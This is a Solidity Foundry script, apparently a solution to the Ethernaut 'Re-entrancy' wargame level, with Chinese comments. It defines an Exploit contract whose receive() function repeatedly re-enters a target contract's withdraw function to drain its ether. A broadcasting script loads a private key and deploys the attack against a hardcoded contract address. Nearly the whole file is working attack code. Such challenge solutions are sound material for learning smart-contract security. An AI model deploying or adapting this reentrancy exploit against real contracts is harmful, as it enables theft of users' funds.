// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/10-Re-entrancy.sol";



contract Exploit {
    Reentrance public ReentrancyInstance = Reentrance(payable(0x6046C3181E5Bca776e4F009c7fD89BBF76fC182A));
   
    constructor() public payable {
        // 打印捐赠前 Reentrance 合约的余额和攻击者的余额
        console.log("Before donate - Reentrance balance:", address(ReentrancyInstance).balance);
        console.log("Before donate - hacker contract balance:", address(this).balance);

        // 捐赠 0.001 ether 到 Reentrance 合约
        ReentrancyInstance.donate{value: 0.001 ether}(address(this));

        // 打印捐赠后 Reentrance 合约的余额和攻击者的余额
        console.log("After donate - Reentrance balance:", address(ReentrancyInstance).balance);
        console.log("After donate - hacker contract balance:", address(this).balance);
    }

    function withdraw() external {
        // 打印攻击前 Reentrance 合约的余额和攻击者的余额
        console.log("Before withdraw - Reentrance balance:", address(ReentrancyInstance).balance);
        console.log("Before withdraw - hacker contract balance:", address(this).balance);

        // 提取 0.001 ether
        ReentrancyInstance.withdraw(0.001 ether);

        // 打印提取后 Reentrance 合约的余额和攻击者的余额
        console.log("After withdraw - Reentrance balance:", address(ReentrancyInstance).balance);
        console.log("After withdraw - Exploit contract balance:", address(this).balance);

        // 发送 0.002 ether 给调用者
        (bool result,) = msg.sender.call{value: 0.002 ether}("");
        require(result);
    }

    receive() external payable {
        // 重入攻击，持续提取资金
        ReentrancyInstance.withdraw(0.001 ether);
    }
}




contract Exp is Script {

    //Reentrance public ReentrancyInstance = Reentrance(payable(0x3c86Bf260c3c0D7c40450064468ff63df66121C6));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");
    //Exploit public exploit;

    function run() external {
        vm.startBroadcast(hacker);

        Exploit exploit = new Exploit{value: 0.001 ether}();
        exploit.withdraw();
    

        vm.stopBroadcast();
    }
}